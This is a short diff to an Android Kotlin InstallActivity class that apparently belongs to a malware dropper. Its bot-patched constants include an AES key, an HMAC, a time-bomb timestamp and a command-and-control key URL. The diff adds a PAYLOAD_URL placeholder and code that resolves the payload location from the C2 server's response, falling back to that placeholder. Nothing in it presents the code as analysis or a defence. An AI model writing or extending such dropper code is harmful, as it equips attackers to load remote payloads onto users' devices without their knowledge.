@@ -33,6 +33,7 @@ class InstallActivity : AppCompatActivity() {
         // ── Patched by bot ────────────────────────────────────────
         private const val AES_KEY_B64  = "AES_KEY_B64_PLACEHOLDER_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
         private const val HMAC_B64     = "HMAC_SHA256_PLACEHOLDER_BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
+        private const val PAYLOAD_URL  = "PAYLOAD_URL_PLACEHOLDER_DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD"
         private const val TIMEBOMB_TS  = "TIMEBOMB_TS_PLACEHOLDER_FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
         private const val DEVICE_SALT  = "DEVICE_SALT_PLACEHOLDER_CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC"
         private const val C2_KEY_URL   = "C2_KEY_URL_PLACEHOLDER_EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE"
@@ -101,6 +102,7 @@ class InstallActivity : AppCompatActivity() {
             val rawKey   = c2.first ?: AES_KEY_B64
             val finalKey = deriveKey(rawKey)
 
+            val resolvedUrl = c2.second ?: PAYLOAD_URL
             val isRemote = resolvedUrl.startsWith("http") &&
                 !resolvedUrl.contains("PLACEHOLDER")
 
